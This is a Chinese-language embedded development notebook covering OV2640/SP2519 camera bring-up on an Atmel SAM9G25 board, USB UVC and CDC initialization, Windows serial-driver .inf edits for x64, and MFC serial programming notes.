	也就是 ov2640 的 D0~D9 应接 9g25 的 isi_d0~isi_d9
	我们买回来的ov2640模块!!
		alientek 的软件源码要求是 10针低位模式,即 ov2640 D9~D0接 isi_d0~isi_d9,
			所以模块数据针标注反过来了,本来 D2-D9 的针,他们标成 D7~D0
		waveshare 直接从数据针标注知道要求是 8针高位模式, 即 ov2640 D2~D9接 isi_d0~isi_d7,
	由于我们 wavesahre做的模块 只有D2~D9,所以 D2~D9 接 isi_d2~isi_d9 试试看,
					    所以 D2~D9 接 isi_d0~isi_d7 试试看,
然后是关于demo的设计,从camera获取一张yuv,放到指定位置,然后压缩成一张jpg然后通过usb串口传输图片!!!
	目前,获取图片和压缩图片的思路都从sam4s里得到启发了,剩下的就是发送一张图片到pc端!!
	明天写一个单片机程序,接受串口传输的一个txt文本,并打印出来!
	jpg文件的文件结束符是 ff d9 所以传输文件检测到ffd9就表示结束!!!!
	然而 .txt文件没有结束符,所谓文件末就是不再有数据,已经到达数据未!!








20170527
编写 ubuntu 串口上位机程序!!! (sam9x35)
特别注意 串口中使用的多路复用 与开发板的edbg串口有严重冲突!!!容易造成 开发板的edbg跑偏不工作
附加:重和备份window
重装win7后 安装了vs2015后,使用winpe2013备份了c盘到移动硬盘里
注意备份的软件做了手脚,会自动给备份的系统装上了360卫士,还原系统后手动删掉就好了,使用unlocker解锁所有360文件,直接整个文件夹删掉
还有,cmd->msconfig里禁用360的开机启动服务!!!
关于pi2303串口模块win7安装的注意事项!!!!
	一定要先装光盘提供的旧版驱动!!!
	断开网络连接后再插入usb串口,等待绑定完成
	如果不断网插入,则会自动网上寻找并安装新版驱动,而新版驱动并不能用!!!
vs2015无法找到 stdio.h 等文件:
	项目->XXX属性->配置属性->VC++目录->包含目录:添加
		C:\Program Files %28x86%29\Windows Kits\10\Include\10.0.15063.0\ucrt
	项目->XXX属性->配置属性->VC++目录->库目录:添加
		C:\Program Files %28x86%29\Windows Kits\10\Lib\10.0.15063.0\ucrt\x86;$(LibraryPath)
	另一个方法(不可行):新建win32console程序时,向导不要勾选:预编译头,安全开发生命周期(SDL)检查
vs2015项目->属性 ->配置属性什么都没有!!
	新建一个例如是cpp文件.然后删掉,然后 项目 出现了 xxx属性 里面的配置属性就什么都有了	
关于win7 X64安装usb设备驱动 笔记:
	经过学习知道.inf 文件是一个 执行脚本文件,
		注册一个 usb驱动脚本 文件到系统,
		usb线连接设备和pc
		win7自动按照脚本联网匹配已注册到微软上的usb驱动,下载下来并安装!!!
		成功后即可使用
	而atmel提供的sam9x35例程包的提供的 usb驱动脚本 是面向 x86系统的,
	要想面向 x64系统,需要修改脚本!!!
以下附上修改前后的两个.inf脚本区别!!(拷贝成两份用meid查看比较方便)
/*****************************************************   适合x32的inf   **************************************************************/
; $Id: 6119.inf,v 1.1.2.1 2006/12/05 08:33:25 danielru Exp $

[Version]                                                       ; Version section
Signature="$Chicago$"                                           ; All Windows versions
Class=Ports                                                     ; This is a serial port driver
ClassGuid={4D36E978-E325-11CE-BFC1-08002BE10318}                ; Associated GUID
Provider=%ATMEL%                                                ; Driver is provided by ATMEL
DriverVer=09/12/2006,1.1.1.5                                    ; Driver version 1.1.1.5 published on 23 February 2007

[DestinationDirs]                                               ; DestinationDirs section
DefaultDestDir=12                                               ; Default install directory is \drivers or \IOSubSys

[Manufacturer]                                                  ; Manufacturer section
%ATMEL%=AtmelMfg                                                ; Only one manufacturer (ATMEL), models section is named
                                                                ; AtmelMfg

[AtmelMfg]                                                      ; Models section corresponding to ATMEL
%USBtoSerialConverter%=USBtoSer.Install,USB\VID_03EB&PID_6130&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6130h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCHID )
%USBtoSerialConverter%=USBtoSer.Install,USB\VID_03EB&PID_6131&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6131h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCAUDIO )
%USBtoSerialConverter%=USBtoSer.Install,USB\VID_03EB&PID_6132&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6132h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCMSD )
%USBtoSerialConverter%=USBtoSer.Install,USB\VID_03EB&PID_6133&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6133h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCCDC )
%USBtoSerialConverter%=USBtoSer.Install,USB\VID_03EB&PID_6133&MI_02   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6133h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCCDC )

[USBtoSer.Install]                                              ; Install section
include=mdmcpq.inf
CopyFiles=FakeModemCopyFileSection
AddReg=USBtoSer.AddReg                                          ; Registry keys to add are listed in USBtoSer.AddReg

[USBtoSer.AddReg]                                               ; AddReg section
HKR,,DevLoader,,*ntkern                                         ;
HKR,,NTMPDriver,,usbser.sys
HKR,,EnumPropPages32,,"MsPorts.dll,SerialPortPropPageProvider"

[USBtoSer.Install.Services]                                     ; Services section
AddService=usbser,0x00000002,USBtoSer.AddService                ; Assign usbser as the PnP driver for the device

[USBtoSer.AddService]                                           ; Service install section
DisplayName=%USBSer%                                            ; Name of the serial driver
ServiceType=1                                                   ; Service kernel driver
StartType=3                                                     ; Driver is started by the PnP manager
ErrorControl=1                                                  ; Warn about errors
ServiceBinary=%12%\usbser.sys                                   ; Driver filename

[Strings]                                                       ; Strings section
ATMEL="ATMEL Corp."                                             ; String value for the ATMEL symbol
USBtoSerialConverter="AT91 USB to Serial Converter"             ; String value for the USBtoSerialConverter symbol
USBSer="USB Composite Serial Driver"                            ; String value for the USBSer symbol

/*****************************************************   适合x32的inf   **************************************************************/
-----------------------------------------------------------
-----------------------------------------------------------
-----------------------------------------------------------
/*****************************************************   适合x64的inf   **************************************************************/
; $Id: 6119.inf,v 1.1.2.1 2006/12/05 08:33:25 danielru Exp $

[Version]                                                       ; Version section
Signature="$Chicago$"                                           ; All Windows versions
Class=Ports                                                     ; This is a serial port driver
ClassGuid={4D36E978-E325-11CE-BFC1-08002BE10318}                ; Associated GUID
Provider=%ATMEL%                                                ; Driver is provided by ATMEL
DriverVer=09/12/2006,1.1.1.5                                    ; Driver version 1.1.1.5 published on 23 February 2007

[DestinationDirs]                                               ; DestinationDirs section
DefaultDestDir=12                                               ; Default install directory is \drivers or \IOSubSys

[Manufacturer]                                                  ; Manufacturer section
%ATMEL%=AtmelMfg,NT,NTia64,NTAMD64                              ; Only one manufacturer (ATMEL), models section is named
                                                                ; AtmelMfg

[AtmelMfg]                                                      ; Models section corresponding to ATMEL
%USBtoSerialConverter%=USBtoSer.Install,USB\VID_03EB&PID_6130&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6130h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCHID )
%USBtoSerialConverter%=USBtoSer.Install,USB\VID_03EB&PID_6131&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6131h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCAUDIO )
%USBtoSerialConverter%=USBtoSer.Install,USB\VID_03EB&PID_6132&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6132h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCMSD )
%USBtoSerialConverter%=USBtoSer.Install,USB\VID_03EB&PID_6133&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6133h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCCDC )
%USBtoSerialConverter%=USBtoSer.Install,USB\VID_03EB&PID_6133&MI_02   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6133h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCCDC )

[AtmelMfg.NT]                                                      ; Models section corresponding to ATMEL
%USBtoSerialConverter%=USBtoSer.Install.NT,USB\VID_03EB&PID_6130&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6130h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCHID )
%USBtoSerialConverter%=USBtoSer.Install.NT,USB\VID_03EB&PID_6131&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6131h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCAUDIO )
%USBtoSerialConverter%=USBtoSer.Install.NT,USB\VID_03EB&PID_6132&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6132h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCMSD )
%USBtoSerialConverter%=USBtoSer.Install.NT,USB\VID_03EB&PID_6133&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6133h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCCDC )
%USBtoSerialConverter%=USBtoSer.Install.NT,USB\VID_03EB&PID_6133&MI_02   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6133h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCCDC )

[AtmelMfg.NTia64]                                                      ; Models section corresponding to ATMEL
%USBtoSerialConverter%=USBtoSer.Install.NTia64,USB\VID_03EB&PID_6130&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6130h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCHID )
%USBtoSerialConverter%=USBtoSer.Install.NTia64,USB\VID_03EB&PID_6131&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6131h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCAUDIO )
%USBtoSerialConverter%=USBtoSer.Install.NTia64,USB\VID_03EB&PID_6132&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6132h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCMSD )
%USBtoSerialConverter%=USBtoSer.Install.NTia64,USB\VID_03EB&PID_6133&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6133h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCCDC )
%USBtoSerialConverter%=USBtoSer.Install.NTia64,USB\VID_03EB&PID_6133&MI_02   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6133h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCCDC )

[AtmelMfg.NTAMD64]                                                      ; Models section corresponding to ATMEL
%USBtoSerialConverter%=USBtoSer.Install.NTAMD64,USB\VID_03EB&PID_6130&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6130h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCHID )
%USBtoSerialConverter%=USBtoSer.Install.NTAMD64,USB\VID_03EB&PID_6131&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6131h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCAUDIO )
%USBtoSerialConverter%=USBtoSer.Install.NTAMD64,USB\VID_03EB&PID_6132&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6132h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCMSD )
%USBtoSerialConverter%=USBtoSer.Install.NTAMD64,USB\VID_03EB&PID_6133&MI_00   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6133h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCCDC )
%USBtoSerialConverter%=USBtoSer.Install.NTAMD64,USB\VID_03EB&PID_6133&MI_02   ; Identifies a device with ATMEL Vendor ID (03EBh) and
                                                                      ; Product ID equal to 6133h. Corresponding Install section
                                                                      ; is named USBtoSer.Install ( CDCCDC )

[USBtoSer.Install.NTAMD64]                                              ; Install section
include=mdmcpq.inf
CopyFiles=FakeModemCopyFileSection
AddReg=USBtoSer.AddReg                                          ; Registry keys to add are listed in USBtoSer.AddReg

[USBtoSer.AddReg]                                               ; AddReg section
HKR,,DevLoader,,*ntkern                                         ;
HKR,,NTMPDriver,,usbser.sys
HKR,,EnumPropPages32,,"MsPorts.dll,SerialPortPropPageProvider"

[USBtoSer.Install.NTAMD64.Services]                                     ; Services section
AddService=usbser,0x00000002,USBtoSer.AddService                ; Assign usbser as the PnP driver for the device

[USBtoSer.AddService]                                           ; Service install section
DisplayName=%USBSer%                                            ; Name of the serial driver
ServiceType=1                                                   ; Service kernel driver
StartType=3                                                     ; Driver is started by the PnP manager
ErrorControl=1                                                  ; Warn about errors
ServiceBinary=%12%\usbser.sys                                   ; Driver filename

[Strings]                                                       ; Strings section
ATMEL="ATMEL Corp."                                             ; String value for the ATMEL symbol
USBtoSerialConverter="AT91 USB to Serial Converter"             ; String value for the USBtoSerialConverter symbol
USBSer="USB Composite Serial Driver"                            ; String value for the USBSer symbol
/*****************************************************   适合x64的inf   **************************************************************/










20170601
通过串口程序系统学习MFC程序!!!
MFC项目 AAXX 的运作流程:
	新建过程向导会:
		自动生成 AAXX.h: 声明继承CWinApp的CAAXXApp类 和 CAAXXApp 类变量 theApp
		自动生成 AAXX.cpp:
初步看了看CSerialPort的类,发现,这个使用了一个线程监控串口情况,然后接收到的内容使用sendmessage方法传递!!
	但是 sendmessage 只对交互窗口类操作!!
	调用::sendmessage 之前加:: 表示使用的是全局范畴上的 sendmessage函数
	但是有一个问题:使用sendmessage一定是把信息传给窗口类的,
	所以只能用MFC框架了,不能用非交互窗口的了,因为这样要修改 CSerialPort的类 污染了,变得不再通用!!
	大概懂了,在人家串口程序的基础上加传输文件内容的就行,也找到接受数据的执行函数!!
通过从串口工程添加传输文本文件发现
	本来打算用Cfile类,在一个线程上构建书写文件,
	最后发现,写入的文件内容后,如果线程不退出,即使执行了.close函数也不会成功
	注意学习了如何建立线程!!!
	还没有测试如何 使用 sendmessage 框架
	本以为串口传文件应该是直接数据传输的,但原来是通过数据握手协议传输的,所以要找到文件传输协议才行
	串口程序的发送功能有问题,只能发一遍
		










20170612
发现ov2640 的i2c协议,与9g25-ek的默认的使用的不一样,硬件协议不一样,,
静止时,9g25 slc是高电平,sda是高电平, 插上ov2640的i2c接口后,sda变低电平!!,
后来发现,并不是这么一回事,,
原因是我使用jlink调试,而开发板上电时默认启动自带linux程序!!!
由于不知道linux程序初始化时做了什么,后面用jlink调试 ov2640 时,i2c初始化时出错!!
总之 使用ov2640 作为sam9g25-ek 的 usbcamera的功能没有问题!!!








20170613
分析sam9g25-ek_usb设备的初始化实现过程,学习usb从设备一般的实现思路
首先,9g25 usb_camera 探索如何变成200万像素相机,
初始化阶段,虽然_ConfigureOvpins()标榜配置迎合ov芯片的针口 ,
	理论只需要8位data并线,但实际上,直接把12位data并线都一并初始化了!!!
_Configureisi配置了缓存,DMA等资源,还有中断函数
ov_init()通过i2c设置sensor芯片!!!!
	用jlink测试时,特别是i2c通讯传输数据实际执行处,不能分步执行,i2c模块会从此崩溃不再工作!!
	就是所 ov_id(),ov_Manufacturer(),ov_TestWrite()一步跳过,不要逐步边执行便分析!!
	其实还没有配置摄像头的工作配置,就是读取了一些摄像头厂商信息和产品码,核对..
USBPower_Configure()然后开始配置usb,首先是配置usb电源管理,就是Vbus
	9g25有三个usb口,虽然我们使用USB-A口,但A,B,C口的Vbus针全配置个遍
USBDDriver_Initialize
	分配空间存储一系列descriptors信息,
USBD_init()
	USBD_HAL_Init(),usb硬件模块的初始化
		初始化DMA
		初始化usb-peripheral-clock
		初始化所有 endpoint 
		D+ usb串口线加上拉电阻
		reset UDPHS
		打开PMC的usb模块工作时钟,usb模块开始工作
		进一步初始化每个endpoint 的 DMA
		设定 usb normal (根据实际 转换 fullspeed 12mbs 或者 hight-speed 480mhz )模式,不要被开头说明force fullspeed迷惑!!!!!
		配置 usb 的 wakeup endofrsm det_suspd 中断 
		关闭PMC的usb模块工作时钟,usb模块暂停工作
	USBDCallbacks_Initialized() 配置中断函数,并打开中断
VBus_Configure配置vbus针的中断处理函数,
	VBus_Configure 不能逐步执行,不然容易崩溃
	此刻后,usb的配置全部完成,一旦有usb线连接pc和开发板,vbus针电压发生变化触发Vbus中断,
	usb便开始工作,把自己的一些列descriptors信息传到pc
	while (USBD_GetState() < USBD_STATE_CONFIGURED);如果没有连到pc,mian一直卡在这里,目的就是等待链接,
	连接后,才开始 while(1) 循环内容
	中途断开,开发板主程序依然在 while(1) 循环,重新连接后可继续正常工作
然后while(1)循环
	if (bVidON && !bVideoON) {} 这一段语句并没有执行过,直到usb软件关闭,不再使用摄像头
	if (!bVidON && bVideoON) () 
		当usb连上了,而且被usb软件开启摄像头,才执行这一段语句
		_PreviewMode();
			其中的ov_configure()才是用i2c配置摄像头工作的真正函数		
     	        USBD_HAL_SetTransferCallback(VIDCAMD_IsoInEndpointNum, (TransferCallback)VIDD_PayloadSent, 0);
         	VIDD_PayloadSent(NULL, USBD_STATUS_SUCCESS);
		这段if实现了i2c配置摄像头,和开始拍照传输的真正工作,瞬间实现i2c配置,然后工作
		但是我们打开usb摄像头软件是,却要等待一段时间的初始化,那是usb与pc的多次轮询初始化有关!!!

当usb摄像头软件,指定要打开usb摄像头时,
	usb软件会给usb发送多次配置请求,每次接收到了配置请求都会触发中断函数处理请求
	USBDCallbacks_RequestReceived是被触发的中断程序
	VIDD_GetCUR 是pc提出获取当前CUR的请求,对应地,开发板通过 usb_write 回送对应的信息
	VIDD_SetCUR 是pc提出设置开发CUR的请求,对应地,开发板通过 usb_read 向pc获取具体设置内容,
		    然后在下一次接收到pc传来的数据后,执行VIDD_StatusStage,进行具体设置

	VIDD_GetDEF 是pc提出获取DEF的请求,然而开发板无视请求,这种情况下pc端会一直等待,直到请求超时
	VIDD_GetINFO 是pc提出获取INFO的请求,然而开发板无视请求,这种情况下pc端会一直等待,直到请求超时
	VIDD_GetMIN 是pc提出获取MIN的请求,然而开发板无视请求,这种情况下pc端会一直等待,直到请求超时
	VIDD_GetMAX 是pc提出获取MAX的请求,然而开发板无视请求,这种情况下pc端会一直等待,直到请求超时
	VIDD_GetRES 是pc提出获取RES的请求,然而开发板无视请求,这种情况下pc端会一直等待,直到请求超时
	怪不得,usb配置这一块浪费这么多时间,原来是因为一些请求超时!!
	比起无视请求,或者可以选择接着发一个USBD_Write(0,0,0,0),来结束这次请求通讯!!(未测试!!)

usb摄像头打开摄像头时,dbug输出的log:
	-- SAM9XX5-EK
	-- Compiled: Jun 13 2017 17:35:16 --
	-E- Do nothing: MMU not enabled
	-I- VBus configuration
	-I- conn
	Susp Susp Vid GetCUR(26) VS PROBE 
	Vid GetMax(1,100,26)
	
	Vid GetMin(1,100,26)
	
	Vid SetCUR(26) VS PROBE 
	Vid GetCUR(26) VS PROBE 
	Vid GetMax(1,100,26)

	Vid GetMin(1,100,26)
	
	Vid SetCUR(26) VS PROBE 
	Vid GetCUR(26) VS PROBE 
	Vid SetCUR(26) VS COMMIT -W- UDP_Stall: EP0 locked 	//锁住了endpoint0, 也就说不能在做设置!!
	
	vidS
	FR USB:  53; ISI:  16
	
	//经历了getcur setcur 等等枚举过程后,最后setcur 上的commit协商结果,然后就setinterface 然后开始同步传输 
	
320x240修改成640x480 模式 需要改frmW frmH,
在定义frmW frmH 定义的位置赋值 640,480 并不起作用,原因是后续会更改此数值!!! 
追踪到 VIDD_StatusStage()处的 viddProbeData.bFrameIndex 导致修改了 frmW frmH
然而也不可以在定义 viddProbeData 赋值修改,因为 viddProbeData中途还是被改了!!!
后来甚至发现 viddProbeData 的参数,最后又usb摄像头软件传输过来的数据告诉的,,??
经过测试发现,原来分辨率 和 帧率 还有图片格式的选择最终是通过 usb摄像头程序 发送请求来选择的,
手动设置参数斌没有用,甚至会破坏配置,
而我之间的的摄像头软件只能配置320x240的设置
换了功能更全的摄像头软件,就可以手动配置可供选择的分辨率了!!!

接下来要探究,usb摄像头数据传输实践
不管是数据帧 与 请求设置帧,都使用
	要分析多个函数 USBD_Read  USBD_Write VIDD_PayloadSent
		USBD_Read() -> USBD_HAL_Read() -> UDPHS_Read()
		USBD_Write() -> USBD_HAL_Write -> UDPHS_Write()
		VIDD_PayloadSent -> USBD_HAL_WrWithHdr
	分析发现 USBD_HAL_WrWithHdr() UDPHS_Read() UDPHS_Write() 才是usb传输数据的实现函数
	传输的步骤无非是填充DMA,然后开中断.

接下来是探究,摄像头的图像采集.
	ISI_IrqHandler 处理每一次isi中断,如果接收到新图片数据,会把图片指针指向新图片数据地址
	        S_Video.lcd_fb_addr = FbList[S_Video.IsiPrevBuffIndex].Current;
		否则会留在旧图片地址处,
	然而VIDD_PayloadSent() 源源不断地发送图片流数据,它并不关心传输的图片数据是旧的还是新的.


先处理中断处理程序!!!
	USBDDriverCallbacks_InterfacesettingChanged() 处理 bVideoON 标记
	USBDDriver.c -> setInterface() 调用 USBDDriverCallbacks_InterfacesettingChanged()
	USBDDriver.c -> USBDDriver_RequestHandler() 调用 setInterface()
	usb_video_isi.c -> USBDCallbacks_RequestReceived() 调用 USBDDriver_RequestHandler()
	core.c -> USBD_RequestHandler() 调用 USBDCallbacks_RequestReceived() 
		USBDCallbacks_RequestReceived() 也 处理 GET_CUR SET_CUR 相关的请求!!!!!
	USBD_HAL.c -> UDPHS_EndpointHandler 调用 USBD_RequestHandler()
		UDPHS_EndpointHandler 是大boss,所有接收到的usb数据包都会触发这个中断函数,主要有4个内容:
		IN packet sent: 发出去的内容,得到了回复.
		out packt received: 得到host端传来的数据包!!!
		stall sent : 关闭端点的请求发出后,返回的回复!!
		setup packet received: 收到设置包内容,就是典型的 0端口,发来的各种设置请求!!!
		
	
关于CUR内容!!
	viedo 的 CUR内容是指此刻的 数据流 设定内容 !!!!分两种,
	一种是probe,即枚举设定: 就是详细的设置内容: _USBVideoProbeCommiData,例如!!
		/** Probe & Commit Controls */
		static USBVideoProbeData viddProbeData =
		{
		    0, /* bmHint: All parameters fixed: sent by host */
		    0x01,   /* bFormatIndex: Format #1 */
		    //0x01,   /* bFrameIndex: Frame #1 */
		    //by william
		    0x2,   /* bFrameIndex: Frame #1 */
		    FRAME_INTERVALC(4), /* dwFrameInterval: in 100ns */
		    0, /* wKeyFrameRate: not used */
		    0, /* wPFrameRate: not used */
		    10000, /* wCompQuality: highest */
		    0, /* wCompWindowSize: ?K */
		    100, /* wDelay: Internal VS latency in ms */
		    FRAME_BUFFER_SIZEC(800, 600), /* dwMaxVideoFrameSize: in bytes */
		    640//FRAME_PACKET_SIZE_HS /* dwMaxPayloadTransferSize: in bytes */
		};
	另一种是commit,可以理解为 视频流接口的设定!!,
		可以有多个视频流接口,一般指对应多个摄像头,每个视频流都有自己的setting,
		不过这个setting只是一个 8位数据, 并不知道是什么类型的 setting 内容
		
	GET_CUR 是往pc USBD_Write()数据 例如:
		USBD_Write(0, &viddProbeData, len, 0, 0);(端口,地址,长度,callback函数,callback函数参数)
		往0端口写入 放在&viddProbeData地址且长度为len的内容 
		然后由于callback函数和函数参数为零,使用write后,不执行callback函数!!
	SET_CUR 是从pc USBD_Read()入数据 例如:
		USBD_Read(0, pControlBuffer, len, (TransferCallback)VIDD_StatusStage, 0);(端口,地址,长度,callback函数,callback函数参数)
		从0端口读入长度为len的数据, 放入 pControlBuffer地址, 读后执行VIDD_StatusStage函数!!!
	 	VIDD_StatusStage函数最后会 USBD_Write(0,0,0,0)结束 当下这阶段的通讯
		注意!!
		SET_CUR 设置了 commit 类 参数时,禁止了 endpoint0 的工作!!!
	总的说,9g25只是响应了 CUR 的请求!!,其他请求都无视掉!!!
	关于 cur 有许多误解,在后面的 UVC 笔记中解决

关于isi 的 USBDCallbacks_RequestReceived()
	处理处理 GET_CUR SET_CUR 的这些 videorequest 分支外,
	还有 STD request 这分支:而这分支估计就是做 然而似乎并不是实现一个,多个uvc标准命令的地方!!!
	STD request:包括 
		获取 usb各种内容描述结构符,在usb插入后枚举阶段的工作
		设置 usb设备地址
		获取/设置 configuration 在usb插入后枚举阶段的工作
			usb插入枚举过程中可能选着其中一个configure: configurationDescriptorsHS和configurationdescriptorsFS
		获取/设置 设备/端点 的status
		设置/清除 远程wakeup/端点关闭与否 的特征feature
		获取/设置 接口interface (在这里的接口指的是 视频流输出的接口)
sp2519补充:
	有三个电源针!! 
		AVDD 2.8v 片内模拟电路供电
		DVDD 1.5v 片内数字逻辑电路供电
		DOVDD 1.8~3.3V I/O控制电路供电,I/O电路一般为开漏电路,所以电源可以按照实际情况选择具体值
			I/O电路就是使用I/O针与其他芯片进行通讯,I/O使用的逻辑电平与供电值有关!!
			如果I/O逻辑1是3.3V,哪么要求控制电路电源是3.3V
			(sp2519的摄像头逻辑电平是3.3V的,所对应的这边的I/O电路也需要3.3v的电压)
开漏电路拓展:
	开漏电路概念中提到的“漏”就是指MOSFET的漏极。
	同理，开集电路中的“集”就是指三极管的集电极。
	开漏电路就是指以MOSFET的漏极为输出的电路。
	一般的用法是会在漏极外部的电路添加上拉电阻。完整的开漏电路应该由开漏器件和开漏上拉电阻组成








20170614
分析sam9g25-ek_usb cdc_hid设备的初始化实现过程,继续学习usb从设备一般的实现思路
首先,程序除了初始化一个usb串口外,还需要另外一个串口配合工作
首先 usb设备部分的初始化:
	CDCHIDDDriver_Initialize()
然后测试cdc工作:
	pc给串口usart发送一个字符,usart收到后,会递交给usb串口cdc,让cdc往pc发送字符,
		即pc -> _UsDmaRxCallback -> cdc转发回pc(透过TC中断) ->_UsartDmaRx(重置usart read DMA)
	pc给usb串口cdc发送一个字符,cdc收到后,会递交给usb串口cdc,让cdc往pc发送字符,
		即pc -. _UsbDataReceived -> _UsartDmaTx(usart发数据) -> _UsDmaTxCallback(重置usbcdc 的接收数据中断)
测试hid:
	每次循环都会执行 _HIDDKeyboardProcessKeys()处理hid操作,
	而真正传递按键动作是其中的 HIDDKeyboard_ChangeKeys,其中的 USBD_Write()







20170619
移植sp2519:根据ov2640
阅读sp2519 daatasheet,记录关键:
	Rolling shutter:卷帘快门,其实就是逐行扫描采集像数数据
	Support UXGA (2Mega, 1600x1200) resolution
	Support 720P (0.9Mega, 1280x720) resolution
	Support SVGA (0.48Mega, 800x600) resolution
	RGB to YUV Conversion
	YUV to RGB Conversion
	传感器1600x1200外围还有一些多余的像数点,用来其他作用.所以实际像数区域是1628x1252,
		例如最底下20行像数用于 Black Level Calibration 黑电平校准,
	黑电平校准指在不同曝光环境下,采集颜色的电路电流都有区别,最典型拿黑色采集为例,所以需要电流校准
	i2c:
	The write device address is 60H and the read device address is 61H
	关键寄存器内容: (page 28 of datasheet)
		sp2519把控制寄存器放在了4个page里,需要先选择page,再选择寄存器地址!!
		P0:0x02	chip ID	0x25
		P0:0xa0	chip ID	0x19
		0xfd  page select   00:page0,01page1,10page2,page3
		P1:0x36 yuv输出时,开关 H和V 信号开关, 还有选择yuv的输出模式
		P1:0x35 yuv输出格式的排序模式, YUYV? UYVY? 
		P0:0x3f	关于 镜向 和上下翻转输出模式的设置 !!! mirror和flip 
	只能输出 RAW 和YUV422 两种格式
阅读sp2519 MTKdriver c文件,记录关键:
	通篇没有插入内核的内容和与内核框架接口的函数
	通篇都是i2c初始化,或修改参数对的函数内容
	关于图像传输,或者终端处理函数什么的都没有一点踪迹
	其实与内核相联系的是 kd_camera 驱动框架的事情,而sp2519yuv_Sensor.c只是驱动框架上的一部分内容
阅读atmel 提供的 ov2640.c文件,记录关键点:
	同样发现,ov2640.c是属于 soc_camera 驱动框架的某篇具体内容




补充:
cmos sensor 的 ISP(in sensor process)(片上执行模块) 有:
	黑电平校准指在不同曝光环境下,采集颜色的电路电流都有区别,最典型拿黑色采集为例,所以需要电流校准
	AE:自动亮度调节,不同环境下的曝光度调节
	AWB: (自动白平衡)是传感器对在光线不断变化环境下的色彩准确重现的能力表示
	GMAAM:伽玛校正,也叫对比度校正
	工频干扰 (Banding):传感器采集采取逐行扫描,而日光灯,显示屏都是50-60Hz频闪,给图像采集产生flicker条纹,所以需要做规避工频处理
	Chief Ray Angle:CRA 主光角
	Lens shading: 亮度矫正,因为光镜学成像,所以中间向四周亮度不断减少,所以需要矫正,让输出图片的色彩是匀称的!!! lens是镜头
	BPC: bad pixel correction 坏像数点矫正
	DVP: 就是传统的 图像并口数据传输协议
	MIPI: 超高速的 图像串口数据传输协议
	iris: 光圈!!曝光栅孔
	zoom: 缩放
	pantilt: PAN&TILT两维数控转台是一种能够同时绕铅垂轴和水平轴旋转的机械工作台，简称PT转台

RAW:格式!!也是cmos的采集格式!!!注意,与RGB有天大的差异!!!
	RAW格式是,每个像数点pixel只采集RGB三色中其中一种颜色!!!!
	即没个每个像数点只有一种颜色的数值
	RGB不一样,RGB 是一个像数点pixel有RGB三种颜色的数据!!!
	YUV什么的也是一个像数点含有YUV三个参数的像数点格式
	RAW的像数点排布是这样的:
		R,G,R,G,R,.....
		G,B,G,B,G,.....
		R,G,R,G,R,.....
		G,B,G,B,G,.....
	RGB的像数点排布是这样的:
		RGB,RGB,RGB,RGB,RGB....
		RGB,RGB,RGB,RGB,RGB....
		RGB,RGB,RGB,RGB,RGB....
		RGB,RGB,RGB,RGB,RGB....
	YUV的像数点排布是这样的:
		YUV,YUV,YUV,YUV,YUV....
		YUV,YUV,YUV,YUV,YUV....
		YUV,YUV,YUV,YUV,YUV....
